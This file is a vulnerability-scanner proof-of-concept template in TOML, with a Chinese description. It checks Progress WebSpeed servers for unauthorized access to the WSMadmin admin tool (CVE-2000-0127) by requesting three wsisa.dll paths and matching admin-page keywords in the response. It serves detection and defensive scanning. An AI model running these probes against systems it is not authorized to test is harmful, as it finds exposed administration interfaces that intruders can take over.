[info]
author = "ave"
description = "检测目标 Progress WebSpeed 服务器是否未正确禁用 WSMadmin 管理工具访问权限。通过访问 wsisa.dll 路径并检查返回内容判断是否存在未授权访问漏洞。攻击者可利用此漏洞获取系统管理权限。"
id = "POC-AVE-2000-0115"
name = "Progress WebSpeed WSMadmin 未授权访问 PoC"
severity = "high"
tags = ["ave-2000-0115"]
vuln_id = [
    "CVE-2000-0127",
    "AVE-2000-0115",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/scripts/wsisa.dll"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "WSMadmin",
    "WebSpeed",
    "WebSpeed Messenger",
    "Messenger Administration",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/wsisa.dll"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "WSMadmin",
    "WebSpeed",
    "WebSpeed Messenger",
    "Messenger Administration",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/wsisa.dll"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "WSMadmin",
    "WebSpeed",
    "WebSpeed Messenger",
    "Messenger Administration",
]
